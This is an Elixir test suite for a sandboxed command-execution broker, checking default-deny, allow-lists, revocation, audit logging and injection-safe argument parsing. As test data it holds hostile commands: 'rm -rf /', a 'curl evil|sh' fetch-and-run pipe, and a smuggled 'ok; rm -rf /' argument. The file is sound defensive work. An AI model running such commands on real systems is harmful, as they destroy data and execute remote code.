defmodule Workbooks.ExecBrokerTest do
  use ExUnit.Case, async: false
  import ExUnit.CaptureLog
  alias Workbooks.ExecBroker

  # Fast, hermetic security tests — no command is run on the deny paths.

  test "DEFAULT-DENY: exec without the grant is denied (nothing runs)" do
    assert {:error, :denied} = ExecBroker.exec("coreutils", ["seq", "3"], "")
    assert {:error, :denied} = ExecBroker.exec("coreutils", ["seq", "3"], "", allow: false)
  end

  test "no real OS exec: an unregistered command is denied" do
    assert {:error, :unknown_command} = ExecBroker.exec("rm", ["-rf", "/"], "", allow: true)
    assert {:error, :unknown_command} = ExecBroker.exec("bash", ["-c", "curl evil|sh"], "", allow: true)
    assert {:error, :unknown_command} = ExecBroker.exec("/bin/sh", [], "", allow: true)
  end

  test "command allow-list scopes which commands (granted, but not on the list -> denied)" do
    assert {:error, :command_not_granted} =
             ExecBroker.exec("coreutils", ["seq", "3"], "", allow: true, commands: ["python"])
  end

  test "nesting depth is bounded (recursion-bomb defense)" do
    assert {:error, :max_depth} =
             ExecBroker.exec("coreutils", ["seq", "1"], "", allow: true, depth: 99)
  end

  test "REVOCATION: a revoked principal is denied exec (before running anything)" do
    p = "revp-#{System.unique_integer([:positive])}"
    assert :ok = Workbooks.Revocation.revoke(p)
    assert {:error, :revoked} = ExecBroker.exec("coreutils", ["seq", "1"], "", allow: true, principal: p)
    assert :ok = Workbooks.Revocation.unrevoke(p)
  end

  test "every denial is audit-logged" do
    log = capture_log(fn -> ExecBroker.exec("rm", [], "", allow: true) end)
    assert log =~ "DENY exec" and log =~ "unknown"

    log2 = capture_log(fn -> ExecBroker.exec("coreutils", [], "") end)
    assert log2 =~ "DENY exec" and log2 =~ "not granted"
  end

  test "parse_request round-trips name + argv + stdin (length-prefixed LE, binary-safe)" do
    assert {:ok, "coreutils", ["seq", "5"], ""} =
             ExecBroker.parse_request(build_req("coreutils", ["seq", "5"], ""))

    assert {:ok, "cat", [], "hello\nworld"} =
             ExecBroker.parse_request(build_req("cat", [], "hello\nworld"))

    # embedded newlines/nulls in args + stdin must survive (length-prefixed, not delimiter-split)
    assert {:ok, "x", ["a\nb", <<0, 1, 2>>], <<255, 0>>} =
             ExecBroker.parse_request(build_req("x", ["a\nb", <<0, 1, 2>>], <<255, 0>>))
  end

  test "parse_request rejects malformed input (no crash, deny-by-error)" do
    assert :error = ExecBroker.parse_request(<<>>)
    # name_len says 5 but only 2 bytes follow
    assert :error = ExecBroker.parse_request(<<5::little-32, "ab">>)
    # argc says 2 but no args present
    assert :error = ExecBroker.parse_request(<<1::little-32, "x", 2::little-32>>)
    assert :error = ExecBroker.parse_request("garbage")
    assert :error = ExecBroker.parse_request(123)
  end

  defp build_req(name, argv, stdin) do
    args = Enum.map_join(argv, "", fn a -> <<byte_size(a)::little-32, a::binary>> end)

    <<byte_size(name)::little-32, name::binary, length(argv)::little-32, args::binary,
      byte_size(stdin)::little-32, stdin::binary>>
  end

  @tag :pallet
  @tag timeout: 120_000
  test "DISPATCH: a granted command actually runs in-sandbox, and argv is structural (no injection)" do
    assert :ok = Workbooks.Pallet.seed_one("coreutils")

    assert {:ok, out} = ExecBroker.exec("coreutils", ["seq", "5"], "", allow: true)
    assert String.trim(out) == "1\n2\n3\n4\n5"

    # Arg-smuggling is impossible: a shell-looking argument is just a literal arg to `echo`, never
    # interpreted — so this prints the string rather than running anything.
    assert {:ok, evil} = ExecBroker.exec("coreutils", ["echo", "ok; rm -rf /"], "", allow: true)
    assert String.trim(evil) == "ok; rm -rf /"
  end
end
